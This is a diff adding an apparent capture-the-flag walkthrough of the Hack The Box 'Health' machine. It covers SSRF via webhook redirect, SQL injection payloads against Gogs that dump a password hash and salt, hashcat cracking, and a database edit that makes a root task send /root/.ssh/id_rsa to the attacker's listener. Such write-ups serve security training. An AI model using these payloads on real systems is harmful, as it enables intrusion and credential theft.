@@ -1,0 +1,159 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Health [Medium] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Health [Medium]"/>
+<meta name="twitter:description" content="Scanning &gt; TARGET=10.129.134.255 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD OPTIONS|_http-server-header: Apache/2."/>
+
+    <meta property="og:title" content="HTB - Health [Medium]" />
+<meta property="og:description" content="Scanning &gt; TARGET=10.129.134.255 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD OPTIONS|_http-server-header: Apache/2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/health/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-08-21T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-08-21T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Health [Medium]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Aug 21, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="scanning">Scanning</h1>
+<pre tabindex="0"><code>&gt; TARGET=10.129.134.255 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT     STATE    SERVICE REASON         VERSION
+22/tcp   open     ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HTTP Monitoring Tool
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+3000/tcp filtered ppp     no-response
+</code></pre><h1 id="web-enum">Web Enum</h1>
+<ul>
+<li>The redirecting for the web is weird (to <a href="https://www.health.htb">www.health.htb</a> and it doesn&rsquo;t show anything)</li>
+<li>i have to use IP for the enum</li>
+<li>webhook can call back with a post</li>
+<li>run a redirect server to redirect the request to a local port on the target</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 redirect.py --port 80 --ip 10.10.16.59 http://127.0.0.1:3000
+</code></pre><ul>
+<li>run a post server to receive the webhook call back</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 ~/tools/pserver.py 8000
+</code></pre><ul>
+<li>We can see from the internal page about the following linked software</li>
+</ul>
+<pre tabindex="0"><code>https://github.com/gogs/gogs/tree/v0.5.5
+</code></pre><ul>
+<li>Research online shows that there is a sqli vulnerability, poc shown below. Note that the database is a sqlite database, so, try the sqli phrases of a sqlite db.</li>
+</ul>
+<pre tabindex="0"><code>curl &#34;http://127.0.0.1:3000/api/v1/users/search?q=&#39;/**/and/**/false)/**/union/**/select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from/**/mysql.db/**/where/**/(&#39;%25&#39;%3D&#39;&#34;
+
+curl http://127.0.0.1:3000/api/v1/users/search?q=e&#39;)/**/union/**/all/**/select/**/1,&#39;1&#39;,(select/**/group_concat(column_name/**/separator/**/&#39;|&#39;)/**/from/**/information_schema.columns/**/where/**/table_name=&#39;user&#39;),&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,1,&#39;1&#39;,1,1,1,1,1,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,1,1,&#39;1&#39;,&#39;1&#39;,null,null,&#39;1&#39;,1,1--/**/-OR/**/(&#39;1&#39;=&#39;1
+</code></pre><ul>
+<li>We receive the following response.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;webhookUrl&#34;</span>:<span style="color:#e6db74">&#34;http:\/\/10.10.16.59:8000&#34;</span>,<span style="color:#f92672">&#34;monitoredUrl&#34;</span>:<span style="color:#e6db74">&#34;http:\/\/10.10.16.59&#34;</span>,<span style="color:#f92672">&#34;health&#34;</span>:<span style="color:#e6db74">&#34;up&#34;</span>,<span style="color:#f92672">&#34;body&#34;</span>:<span style="color:#e6db74">&#34;{\&#34;data\&#34;:[{\&#34;username\&#34;:\&#34;susanne\&#34;,\&#34;avatar\&#34;:\&#34;\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\&#34;},{\&#34;username\&#34;:\&#34;66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\&#34;,\&#34;avatar\&#34;:\&#34;\/\/1.gravatar.com\/avatar\/1\&#34;}],\&#34;ok\&#34;:true}&#34;</span>,<span style="color:#f92672">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;HTTP\/1.0 301 Moved Permanently&#34;</span>,<span style="color:#f92672">&#34;headers&#34;</span>:{<span style="color:#f92672">&#34;Server&#34;</span>:<span style="color:#e6db74">&#34;BaseHTTP\/0.6 Python\/3.10.5&#34;</span>,<span style="color:#f92672">&#34;Date&#34;</span>:<span style="color:#e6db74">&#34;Sun, 21 Aug 2022 23:47:20 GMT&#34;</span>,<span style="color:#f92672">&#34;Location&#34;</span>:<span style="color:#e6db74">&#34;http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=e&#39;)\/**\/union\/**\/all\/**\/select\/**\/1,&#39;1&#39;,(select\/**\/passwd\/**\/from\/**\/user),&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,1,&#39;1&#39;,1,1,1,1,1,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,1,1,&#39;1&#39;,&#39;1&#39;,null,null,&#39;1&#39;,1,1--\/**\/-OR\/**\/(&#39;1&#39;=&#39;1&#34;</span>,<span style="color:#f92672">&#34;Content-Type&#34;</span>:<span style="color:#e6db74">&#34;application\/json; charset=UTF-8&#34;</span>,<span style="color:#f92672">&#34;Set-Cookie&#34;</span>:<span style="color:#e6db74">&#34;_csrf=; Path=\/; Max-Age=0&#34;</span>,<span style="color:#f92672">&#34;Content-Length&#34;</span>:<span style="color:#e6db74">&#34;264&#34;</span>}}
+</span></span></code></pre></div><ul>
+<li>The username and credential hash can be found</li>
+</ul>
+<pre tabindex="0"><code>susanne:66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37
+</code></pre><ul>
+<li>Next we dump the salt</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 redirect.py --port 80 --ip 10.10.16.59 &#34;http://127.0.0.1:3000/api/v1/users/search?q=e&#39;)/**/union/**/all/**/select/**/1,&#39;1&#39;,(select/**/salt/**/from/**/user),&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,1,&#39;1&#39;,1,1,1,1,1,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,1,1,&#39;1&#39;,&#39;1&#39;,null,null,&#39;1&#39;,1,1--/**/-OR/**/(&#39;1&#39;=&#39;1&#34;
+salt:sO3XIbeW14
+</code></pre><ul>
+<li>According to the source code, the hash function is <code>pbkdf2</code></li>
+</ul>
+<pre tabindex="0"><code>PBKDF2([]byte(u.Passwd), []byte(u.Salt), 10000, 50, sha256.New)
+password, salt []byte, iter, keyLen int, h func() hash.Hash
+</code></pre><ul>
+<li>Check hashcat doc format, <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></li>
+</ul>
+<pre tabindex="0"><code>sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
+</code></pre><ul>
+<li>Note that the credential hash is exact the hex representation of the credential hash. So, we need to first convert it to the corresponding byte form/ The hashes should be arranged as</li>
+</ul>
+<pre tabindex="0"><code>&gt; echo &#39;pass_from_sqli&#39; | xxd -r -p | base64
+
+# Then format the hash as this
+sha256:10000:&lt;base64_salt&gt;:&lt;base64_hash&gt;
+sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
+</code></pre><ul>
+<li>Crack it using hash cat</li>
+</ul>
+<pre tabindex="0"><code>sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15
+</code></pre><ul>
+<li>Now, we can login as susanne and fetch the user flag</li>
+</ul>
+<h1 id="pe">PE</h1>
+<ul>
+<li>Using pspy64, we learnt that there is a background task that runs the created tasks from the webapp as root.</li>
+<li>We can also find the password to the database used for this app.</li>
+<li>So, in principle, we can create a new task and update the task content in the db to make it load a local file, e.g /root/.ssh/id_rsa.</li>
+<li>Create a new tasks on the web as before</li>
+<li>Login to db and update the task&rsquo;s monitoredUrl</li>
+</ul>
+<pre tabindex="0"><code>&gt; update tasks set webhookUrl=&#39;file:///root/.ssh/id_rsa&#39;;
+</code></pre><ul>
+<li>Receive the callback and get root’s id_rsa</li>
+<li>Login as root to fetch the root flag</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
